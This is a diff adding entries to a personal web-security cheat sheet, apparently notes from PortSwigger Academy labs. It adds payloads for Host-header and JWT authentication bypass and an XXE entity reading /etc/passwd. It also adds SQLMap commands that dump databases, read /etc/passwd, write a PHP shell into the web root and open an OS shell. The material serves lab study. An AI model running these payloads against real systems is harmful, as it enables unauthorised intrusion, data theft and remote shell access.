@@ -198,6 +198,13 @@ Find unkeyed headers using [Param Miner](https://portswigger.net/bappstore/17d29
 
 [Lab: Web cache poisoning with an unkeyed header](https://portswigger.net/web-security/web-cache-poisoning/exploiting-design-flaws/lab-web-cache-poisoning-with-an-unkeyed-header)
 
+#### HTTP Host header attacks
+
+##### Authentication Bypass
+
+Change the Host header to `localhost` bypasses the authentication mechanism to the admin panel.
+
+[Lab: Host header authentication bypass](https://portswigger.net/web-security/host-header/exploiting/lab-host-header-authentication-bypass)
 
 #### Http request smuggling
 
@@ -339,7 +346,21 @@ document.location="http://stock.ID.web-security-academy.net/?productId=1<script>
 
 #### JWT
 
-#### Change password
+Use [JWT Editor](https://portswigger.net/bappstore/26aaa5ded2f74beea19e2ed8345a93dd) extension.
+
+##### Unverified Signature
+
+With the JWT Editor extension, requests containing JWT are highlighted in the HTTP history section. Double clicking the JWT shows decoded data in Inspector. Change the username in the sub claim to admin and also change the path to `/administrator`.
+
+[Lab: JWT authentication bypass via unverified signature](https://portswigger.net/web-security/jwt/lab-jwt-authentication-bypass-via-unverified-signature)
+
+#### Changing password
+
+##### Password Reset Broken Logic
+
+Deleting the value of `temp-forgot-password-token` doesn't cause an error. 
+
+[Lab: Password reset broken logic](https://portswigger.net/web-security/authentication/other-mechanisms/lab-password-reset-broken-logic)
 
 #### Broken access control
 
@@ -385,8 +406,28 @@ Redirect the output to a writable file:
 #### XXE
 
 Indicators:  
-xml is used  
+Request contain xml data  
 
+Hidden attack surface:  
+data is placed into a back-end SOAP request -> XInclude attacks  
+[SVG file upload](SVG file upload)
+
+Test:
+```xml
+<!--?xml version="1.0" ?-->
+<!DOCTYPE replace [<!ENTITY example "Doe"> ]>
+ <userInfo>
+  <firstName>John</firstName>
+  <lastName>&example;</lastName>
+ </userInfo>
+```
+If the output replaces `&example;` with Doe, the target is likely vulnerable to XXE.
+
+##### Basic XXE to retrieve files
+
+Inserting `<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>` and change the value of the parameter to `&xxe;`.
+
+[Lab: Exploiting XXE using external entities to retrieve files](https://portswigger.net/web-security/xxe/lab-exploiting-xxe-to-retrieve-files)
 
 #### LFI
 
@@ -547,7 +588,32 @@ Get credentials:
 
 ### SQLMap
 
+Basic usage (including OR tests)
+```sql
+sqlmap -u 'http://TARGET_IP:TARGET_PORT/example.php?id=*' --level 2 --risk 2 --batch --dump --random-agent
+```
+`*` specifies the test location.
 
+Adding prefix and suffix:
+```sql
+sqlmap -u "www.example.com/?q=test" --prefix="%'))" --suffix="-- -"
+```
+
+Database enumeration:
+```sql
+sqlmap -u "http://www.example.com/?id=1" --banner --current-user --current-db --is-dba
+```
+
+Reading files:
+```sql
+sqlmap -u "http://www.example.com/?id=1" --file-read "/etc/passwd"
+```
+
+Writing files:
+```sql
+sqlmap -u "http://www.example.com/?id=1" --file-write "shell.php" --file-dest "/var/www/html/shell.php"
+```
+You could use `--os-shell` to open a shell.
 
 ## References
 [PortSwigger Academy Labs](https://portswigger.net/web-security/all-labs)  
